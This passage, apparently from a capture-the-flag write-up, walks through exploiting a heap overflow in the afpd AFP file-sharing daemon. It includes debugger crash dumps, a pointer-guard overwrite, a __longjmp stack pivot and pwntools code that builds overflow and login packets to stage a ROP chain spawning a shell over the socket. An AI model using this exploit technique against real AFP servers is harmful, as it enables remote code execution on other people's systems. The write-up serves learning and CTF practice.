+$eflags: [zero CARRY parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe220│+0x0000: 0x00000000007d00e7	 ← $rsp
+0x00007fffffffe228│+0x0008: 0x00007ffff7b5cb12  →  "__stack_chk_fail"
+0x00007fffffffe230│+0x0010: 0x00007ffff7b58950  →  0x00000012000000b2
+0x00007fffffffe238│+0x0018: 0x00007ffff7df785e  →  0x3d656c69660a0000
+0x00007fffffffe240│+0x0020: 0x00007fffffffe370  →  0x00007ffff7b5c4a8  →  0x000c001200001f3a
+0x00007fffffffe248│+0x0028: 0x00007ffff7deac48  →  &lt;_dl_exception_create_format+360&gt; test rax, rax
+0x00007fffffffe250│+0x0030: 0x000000000000001e
+0x00007fffffffe258│+0x0038: 0x00007fffffffe280  →  0x0000000000000007
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff73da2b5 &lt;malloc+373&gt;     je     0x7ffff73da1ac &lt;__GI___libc_malloc+108&gt;
+   0x7ffff73da2bb &lt;malloc+379&gt;     nop    DWORD PTR [rax+rax*1+0x0]
+   0x7ffff73da2c0 &lt;malloc+384&gt;     lea    rsi, [rcx+rax*8]
+ → 0x7ffff73da2c4 &lt;malloc+388&gt;     mov    rdx, QWORD PTR [rsi+0x40]
+   0x7ffff73da2c8 &lt;malloc+392&gt;     test   rdx, rdx
+   0x7ffff73da2cb &lt;malloc+395&gt;     je     0x7ffff73da1ac &lt;__GI___libc_malloc+108&gt;
+   0x7ffff73da2d1 &lt;malloc+401&gt;     cmp    rax, 0x3f
+   0x7ffff73da2d5 &lt;malloc+405&gt;     ja     0x7ffff73da2f8 &lt;__GI___libc_malloc+440&gt;
+   0x7ffff73da2d7 &lt;malloc+407&gt;     mov    rdi, QWORD PTR [rdx]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "afpd", stopped 0x7ffff73da2c4 in __GI___libc_malloc (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7ffff73da2c4 → __GI___libc_malloc(bytes=0x7f)
+[#1] 0x7ffff7deac48 → __GI__dl_exception_create_format(exception=0x7fffffffe370, objname=&lt;optimized out&gt;, fmt=0x7ffff7df7818 "symbol %s version %s not defined in file %s with link time reference%s")
+[#2] 0x7ffff7dde9ea → _dl_lookup_symbol_x(undef_name=0x7ffff7b5cb12 "__stack_chk_fail", undef_map=0x7ffff7ff4000, ref=0x7fffffffe3e8, symbol_scope=0x7ffff7ff4358, version=0x7ffff7ff5c48, type_class=0x1, flags=0x5, skip_map=&lt;optimized out&gt;)
+[#3] 0x7ffff7de3053 → _dl_fixup(l=&lt;optimized out&gt;, reloc_arg=&lt;optimized out&gt;)
+[#4] 0x7ffff7dea96a → _dl_runtime_resolve_xsavec()
+[#5] 0x7ffff7b992e7 → readt()
+[#6] 0x7ffff7b7a960 → dsi_stream_read()
+[#7] 0x7ffff7b7af7b → dsi_stream_receive()
+[#8] 0x40b517 → afp_over_dsi()
+[#9] 0x4098c6 → main()</code></pre></figure>
+
+<p>Ok, we broke something very seriously now, so <code class="language-plaintext highlighter-rouge">afpd</code> tries to allocate memory for storing an exception. It tries to allocate a buffer with size <code class="language-plaintext highlighter-rouge">0x7f</code> getting a chunk from tcache, and it seems that we overflow the tcache pointer for this client thread.</p>
+
+<p>Sooooooo, when I hit this segfault in the CTF, I went down the rabbit hole, and created a fake tcache in bss to fulfill all following allocations, which then finally resulted in a <code class="language-plaintext highlighter-rouge">__longjmp</code> for which we control all registers.</p>
+
+<p>Long story short, that was a real pain ;)</p>
+
+<p>For this, I had to do a valid login before the overflowing package, in which I created a fake tcache arena in the username (which must not be longer than 255 chars), which needed to be forged in a way, that it succeeds all the following allocations (thus also creating valid looking free fastbins in the username) and put a ropchain also in.</p>
+
+<p>With a 255 length username that was not quite easy, thus I tried to do another read for the final ropchain, which got totally fucked up by the oversized payload, that was still in the buffer (always landing in random positions in the buffer). It took me around 4 hours to realize, that we will just not be successful in doing a second read =(</p>
+
+<p>I then just went and optimized the initial ropchain to do a “dup2(socket, 1); dup2(socket, 0); execve(“/bin/sh”, 0, 0);” and also stuffed it into the username (in between tcache arena, so we also had to jump over the needed tcache pointers).</p>
+
+<p>But while doing the writeup, I found, that this can be done in a much easier way. If I’d just have stepped back for a moment while doing this challenge in the ctf.</p>
+
+<p>Just pass this a pointer to a blank space in bss will make it think that there are no free tcache chunks and happily just continue running into the same exception handling (though this time, we can use the username completely without any extra hurdles).</p>
+
+<p>Let’s see, how that works out</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">command</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">AFP_LOGIN</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">version</span><span class="p">))</span> <span class="o">+</span> <span class="n">version</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">uams</span><span class="p">))</span> <span class="o">+</span> <span class="n">uams</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="o">+</span> <span class="n">user</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x101000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>	
+<span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">4656</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x63d300</span><span class="p">)</span>							<span class="c1"># fake empty tcache arena
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">4736</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">4656</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x644820</span><span class="p">)</span>							<span class="c1"># bss address for storing errno
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">4738</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
+__GI__dl_signal_exception (errcode=0x0, exception=0x7ffd83bc4df0, occasion=0x7f7612ee3a55 "relocation error") at dl-error-skeleton.c:95
+95	in dl-error-skeleton.c
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x3363413263413163 ("c1Ac2Ac3"?)
+$rbx   : 0x00007ffd83bc4df0  →  0x0000000001d01a1b  →  "/home/metatalk/libatalk.so.18"
+$rcx   : 0x1e              
+$rdx   : 0x00007f7612ee3a55  →  "relocation error"
+$rsp   : 0x00007ffd83bc4d50  →  0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"
+$rbp   : 0x0               
+$rsi   : 0x00007ffd83bc4df0  →  0x0000000001d01a1b  →  "/home/metatalk/libatalk.so.18"
+$rdi   : 0x0               
+$rip   : 0x00007f76125980f4  →  &lt;_dl_signal_exception+20&gt; mov rdx, QWORD PTR [rax]
+$r8    : 0xffff            
+$r9    : 0x0               
+$r10   : 0x00007f7612ee369f  →  0x706e203d3d206900
+$r11   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r12   : 0x00007f7612ee3a55  →  "relocation error"
+$r13   : 0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"
+$r14   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd83bc4d50│+0x0000: 0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"	 ← $rsp
+0x00007ffd83bc4d58│+0x0008: 0x00007f7612edcd58  →   nop DWORD PTR [rax+rax*1+0x0]
+0x00007ffd83bc4d60│+0x0010: 0x00007ffd83bc4df0  →  0x0000000001d01a1b  →  "/home/metatalk/libatalk.so.18"
+0x00007ffd83bc4d68│+0x0018: 0x00007f76130e8358  →  0x00007f76130ec428  →  0x00007f76130e9a20  →  0x00007f76130ec170  →  0x0000000000000000
+0x00007ffd83bc4d70│+0x0020: 0x00007ffd83bc4e68  →  0x00007f7612c476d0  →  0x0000001200000bb0
+0x00007ffd83bc4d78│+0x0028: 0x00007f7612ecc5ad  →  &lt;_dl_lookup_symbol_x+845&gt; mov rdi, rbx
+0x00007ffd83bc4d80│+0x0030: 0x00007f7612c4b610  →  "strerror"
+0x00007ffd83bc4d88│+0x0038: 0x000000013148f100
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f76125980eb &lt;_dl_signal_exception+11&gt; mov    rax, QWORD PTR fs:[rax]
+   0x7f76125980ef &lt;_dl_signal_exception+15&gt; test   rax, rax
+   0x7f76125980f2 &lt;_dl_signal_exception+18&gt; je     0x7f761259811a &lt;__GI__dl_signal_exception+58&gt;
+ → 0x7f76125980f4 &lt;_dl_signal_exception+20&gt; mov    rdx, QWORD PTR [rax]
+   0x7f76125980f7 &lt;_dl_signal_exception+23&gt; movdqu xmm0, XMMWORD PTR [rsi]
+   0x7f76125980fb &lt;_dl_signal_exception+27&gt; movups XMMWORD PTR [rdx], xmm0
+   0x7f76125980fe &lt;_dl_signal_exception+30&gt; mov    rcx, QWORD PTR [rsi+0x10]
+   0x7f7612598102 &lt;_dl_signal_exception+34&gt; mov    esi, 0x1
+   0x7f7612598107 &lt;_dl_signal_exception+39&gt; mov    QWORD PTR [rdx+0x10], rcx
+────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>
+
+<p>So, now we’re crashing directly in <code class="language-plaintext highlighter-rouge">_dl_signal_exception</code> (exactly where we want to go). Let’s just fix <code class="language-plaintext highlighter-rouge">rax</code> and put some bss pointer there, so it doesn’t crash. We just have to make sure, that there is a valid address, which can be dereferenced by the following <code class="language-plaintext highlighter-rouge">movups XMMWORD PTR [rdx], xmm0</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000000000063d0a0│+0x00a0: 0x0000000000000000
+0x000000000063d0a8│+0x00a8: 0x0000000000000000
+0x000000000063d0b0│+0x00b0: 0x0000000000000000
+0x000000000063d0b8│+0x00b8: 0x0000000001ce77a0  →  0x0000000000000000
+0x000000000063d0c0│+0x00c0: 0x0000000001ce77a0  →  0x0000000000000000</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">command</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">AFP_LOGIN</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">version</span><span class="p">))</span> <span class="o">+</span> <span class="n">version</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">uams</span><span class="p">))</span> <span class="o">+</span> <span class="n">uams</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="o">+</span> <span class="n">user</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x101000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>	
+<span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">4656</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x63d300</span><span class="p">)</span>                                 <span class="c1"># fake empty tcache arena
+</span><span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000063d0b8</span><span class="p">)</span>                       <span class="c1"># bss pointer to not crash in dl_signal
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">4736</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">4656</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x644820</span><span class="p">)</span>                                 <span class="c1"># bss address for storing errno
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">4738</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span></code></pre></figure>
+
+<p>With this, we’ll now get smoothly through <code class="language-plaintext highlighter-rouge">_dl_signal_exception</code> and land here</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007f7612598115	99	in dl-error-skeleton.c
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x000000000063d0b8  →  0x0000000001ce77a0  →  0x0000000000000000
+$rbx   : 0x00007ffd83bc4df0  →  0x0000000001d01a5b  →  "/home/metatalk/libatalk.so.18"
+$rcx   : 0x0000000001d01a00  →  "symbol strerror version GLIBC_2.2.5 not defined in[...]"
+$rdx   : 0x0000000001ce77a0  →  0x0000000000000000
+$rsp   : 0x00007ffd83bc4d50  →  0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"
+$rbp   : 0x0               
+$rsi   : 0x1               
+$rdi   : 0x000000000063d0c8  →  0x0000000000000000
+$rip   : 0x00007f7612598115  →  &lt;_dl_signal_exception+53&gt; call 0x7f761246fd80 &lt;__longjmp&gt;
+$r8    : 0xffff            
+$r9    : 0x0               
+$r10   : 0x00007f7612ee369f  →  0x706e203d3d206900
+$r11   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r12   : 0x00007f7612ee3a55  →  "relocation error"
+$r13   : 0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"
+$r14   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd83bc4d50│+0x0000: 0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"	 ← $rsp
+0x00007ffd83bc4d58│+0x0008: 0x00007f7612edcd58  →   nop DWORD PTR [rax+rax*1+0x0]
+0x00007ffd83bc4d60│+0x0010: 0x00007ffd83bc4df0  →  0x0000000001d01a5b  →  "/home/metatalk/libatalk.so.18"
+0x00007ffd83bc4d68│+0x0018: 0x00007f76130e8358  →  0x00007f76130ec428  →  0x00007f76130e9a20  →  0x00007f76130ec170  →  0x0000000000000000
+0x00007ffd83bc4d70│+0x0020: 0x00007ffd83bc4e68  →  0x00007f7612c476d0  →  0x0000001200000bb0
+0x00007ffd83bc4d78│+0x0028: 0x00007f7612ecc5ad  →  &lt;_dl_lookup_symbol_x+845&gt; mov rdi, rbx
+0x00007ffd83bc4d80│+0x0030: 0x00007f7612c4b610  →  "strerror"
+0x00007ffd83bc4d88│+0x0038: 0x000000013148f100
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f761259810b &lt;_dl_signal_exception+43&gt; mov    rdx, QWORD PTR [rax+0x8]
+   0x7f761259810f &lt;_dl_signal_exception+47&gt; mov    DWORD PTR [rdx], edi
+   0x7f7612598111 &lt;_dl_signal_exception+49&gt; lea    rdi, [rax+0x10]
+ → 0x7f7612598115 &lt;_dl_signal_exception+53&gt; call   0x7f761246fd80 &lt;__longjmp&gt;
+   ↳  0x7f761246fd80 &lt;__longjmp+0&gt;    mov    r8, QWORD PTR [rdi+0x30]
+      0x7f761246fd84 &lt;__longjmp+4&gt;    mov    r9, QWORD PTR [rdi+0x8]
+      0x7f761246fd88 &lt;__longjmp+8&gt;    mov    rdx, QWORD PTR [rdi+0x38]
+      0x7f761246fd8c &lt;__longjmp+12&gt;   ror    r8, 0x11
+      0x7f761246fd90 &lt;__longjmp+16&gt;   xor    r8, QWORD PTR fs:0x30
+      0x7f761246fd99 &lt;__longjmp+25&gt;   ror    r9, 0x11</code></pre></figure>
+
+<p>calling <code class="language-plaintext highlighter-rouge">__longjmp</code> and <code class="language-plaintext highlighter-rouge">rdi</code> will be just the address we passed to it <code class="language-plaintext highlighter-rouge">+0x10</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007f7612ede2c0 &lt;+0&gt;:	mov    r8,QWORD PTR [rdi+0x30]
+0x00007f7612ede2c4 &lt;+4&gt;:	mov    r9,QWORD PTR [rdi+0x8]
+0x00007f7612ede2c8 &lt;+8&gt;:	mov    rdx,QWORD PTR [rdi+0x38]
+0x00007f7612ede2cc &lt;+12&gt;:	ror    r8,0x11
+0x00007f7612ede2d0 &lt;+16&gt;:	xor    r8,QWORD PTR [rip+0x20c459]        # 0x7f76130ea730 &lt;__pointer_chk_guard_local&gt;
+0x00007f7612ede2d7 &lt;+23&gt;:	ror    r9,0x11
+0x00007f7612ede2db &lt;+27&gt;:	xor    r9,QWORD PTR [rip+0x20c44e]        # 0x7f76130ea730 &lt;__pointer_chk_guard_local&gt;
+0x00007f7612ede2e2 &lt;+34&gt;:	ror    rdx,0x11
+0x00007f7612ede2e6 &lt;+38&gt;:	xor    rdx,QWORD PTR [rip+0x20c443]        # 0x7f76130ea730 &lt;__pointer_chk_guard_local&gt;
+0x00007f7612ede2ed &lt;+45&gt;:	nop
+0x00007f7612ede2ee &lt;+46&gt;:	mov    rbx,QWORD PTR [rdi]
+0x00007f7612ede2f1 &lt;+49&gt;:	mov    r12,QWORD PTR [rdi+0x10]
+0x00007f7612ede2f5 &lt;+53&gt;:	mov    r13,QWORD PTR [rdi+0x18]
+0x00007f7612ede2f9 &lt;+57&gt;:	mov    r14,QWORD PTR [rdi+0x20]
+0x00007f7612ede2fd &lt;+61&gt;:	mov    r15,QWORD PTR [rdi+0x28]
+0x00007f7612ede301 &lt;+65&gt;:	mov    eax,esi
+0x00007f7612ede303 &lt;+67&gt;:	mov    rsp,r8
+0x00007f7612ede306 &lt;+70&gt;:	mov    rbp,r9
+0x00007f7612ede309 &lt;+73&gt;:	nop
+0x00007f7612ede30a &lt;+74&gt;:	jmp    rdx</code></pre></figure>
+
+<p>This is beatuiful for stack pivoting…</p>
+
+<p><code class="language-plaintext highlighter-rouge">r8</code>, <code class="language-plaintext highlighter-rouge">r9</code> and <code class="language-plaintext highlighter-rouge">rdx</code> will be taken from memory relative to <code class="language-plaintext highlighter-rouge">rdi</code> (which we control) and at the end <code class="language-plaintext highlighter-rouge">rsp</code> will be set to <code class="language-plaintext highlighter-rouge">r8</code>, <code class="language-plaintext highlighter-rouge">rbp</code> to <code class="language-plaintext highlighter-rouge">r9</code> and we’ll jump to <code class="language-plaintext highlighter-rouge">rdx</code>.</p>
+
+<p>We just have to check for the demangling, that seems to happen there</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007f7612ede2cc &lt;+12&gt;:	ror    r8,0x11
+0x00007f7612ede2d0 &lt;+16&gt;:	xor    r8,QWORD PTR [rip+0x20c459]        # 0x7f76130ea730 &lt;__pointer_chk_guard_local&gt;
+0x00007f7612ede2d7 &lt;+23&gt;:	ror    r9,0x11
+0x00007f7612ede2db &lt;+27&gt;:	xor    r9,QWORD PTR [rip+0x20c44e]        # 0x7f76130ea730 &lt;__pointer_chk_guard_local&gt;
+0x00007f7612ede2e2 &lt;+34&gt;:	ror    rdx,0x11
+0x00007f7612ede2e6 &lt;+38&gt;:	xor    rdx,QWORD PTR [rip+0x20c443]        # 0x7f76130ea730 &lt;__pointer_chk_guard_local&gt;</code></pre></figure>
+
+<p>but, if we debug it…</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x000000000063d0b8  →  0x0000000001ce77a0  →  0x0000000000000000
+$rbx   : 0x00007ffd83bc4df0  →  0x0000000001d01a5b  →  "/home/metatalk/libatalk.so.18"
+$rcx   : 0x0000000001d01a00  →  "symbol strerror version GLIBC_2.2.5 not defined in[...]"
+$rdx   : 0x0               
+$rsp   : 0x00007ffd83bc4d48  →  0x00007f761259811a  →  &lt;_dl_signal_exception+58&gt; mov rcx, QWORD PTR [rsi+0x8]
+$rbp   : 0x0               
+$rsi   : 0x1               
+$rdi   : 0x000000000063d0c8  →  0x0000000000000000
+$rip   : 0x00007f761246fd99  →  &lt;__longjmp+25&gt; ror r9, 0x11
+$r8    : 0x3562413462413362 ("b3Ab4Ab5"?)
+$r9    : 0x0               
+$r10   : 0x00007f7612ee369f  →  0x706e203d3d206900
+$r11   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r12   : 0x00007f7612ee3a55  →  "relocation error"
+$r13   : 0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"
+$r14   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd83bc4d48│+0x0000: 0x00007f761259811a  →  &lt;_dl_signal_exception+58&gt; mov rcx, QWORD PTR [rsi+0x8]	 ← $rsp
+0x00007ffd83bc4d50│+0x0008: 0x00007f76130e9c00  →  0x00007f7612c4cdf2  →  "GLIBC_2.2.5"
+0x00007ffd83bc4d58│+0x0010: 0x00007f7612edcd58  →   nop DWORD PTR [rax+rax*1+0x0]
+0x00007ffd83bc4d60│+0x0018: 0x00007ffd83bc4df0  →  0x0000000001d01a5b  →  "/home/metatalk/libatalk.so.18"
+0x00007ffd83bc4d68│+0x0020: 0x00007f76130e8358  →  0x00007f76130ec428  →  0x00007f76130e9a20  →  0x00007f76130ec170  →  0x0000000000000000
+0x00007ffd83bc4d70│+0x0028: 0x00007ffd83bc4e68  →  0x00007f7612c476d0  →  0x0000001200000bb0
+0x00007ffd83bc4d78│+0x0030: 0x00007f7612ecc5ad  →  &lt;_dl_lookup_symbol_x+845&gt; mov rdi, rbx
+0x00007ffd83bc4d80│+0x0038: 0x00007f7612c4b610  →  "strerror"
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f761246fd88 &lt;__longjmp+8&gt;    mov    rdx, QWORD PTR [rdi+0x38]
+   0x7f761246fd8c &lt;__longjmp+12&gt;   ror    r8, 0x11
+   0x7f761246fd90 &lt;__longjmp+16&gt;   xor    r8, QWORD PTR fs:0x30
+ → 0x7f761246fd99 &lt;__longjmp+25&gt;   ror    r9, 0x11</code></pre></figure>
+
+<p>we can see, that our cyclic pattern has overwritten the local <code class="language-plaintext highlighter-rouge">__pointer_chk_guard</code>, so we also control the guard value.</p>
+
+<p>We now just have to prepare a fake stack somewhere, put our ropchain there, prepare the <code class="language-plaintext highlighter-rouge">__longjmp</code> call and should be ready to go.</p>
+
+<p>This we can now do in a similar way, like I did it in the ctf. Just put everything in the username in a successful login (before overflowing), which will then be stored on bss at a known offset (in <code class="language-plaintext highlighter-rouge">obj</code>).</p>
+
+<p>Let’s prepare our ropchain.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Do valid login to prepare ropchain on bss"</span><span class="p">)</span>
+
+<span class="n">version</span> <span class="o">=</span> <span class="s">"AFP2.2"</span>
+<span class="n">uams</span> <span class="o">=</span> <span class="s">"DHX"</span>	
+
+<span class="n">user</span> <span class="o">=</span> <span class="s">"metatalk"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000640000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000640000</span><span class="p">)</span>          <span class="c1"># put valid address here for dl_signal
+</span><span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+
+<span class="n">command</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">AFP_LOGIN</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">version</span><span class="p">))</span> <span class="o">+</span> <span class="n">version</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">uams</span><span class="p">))</span> <span class="o">+</span> <span class="n">uams</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="o">+</span> <span class="n">user</span>
+
+<span class="n">send_dsi_package</span><span class="p">(</span><span class="n">DSIFUNC_CMD</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overflow package data"</span><span class="p">)</span>
+	
+<span class="n">user</span> <span class="o">=</span> <span class="s">"metatalk"</span>
+
+<span class="n">command</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">AFP_LOGIN</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">version</span><span class="p">))</span> <span class="o">+</span> <span class="n">version</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">uams</span><span class="p">))</span> <span class="o">+</span> <span class="n">uams</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="o">+</span> <span class="n">user</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x101000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>	
+<span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">4656</span><span class="p">)</span>
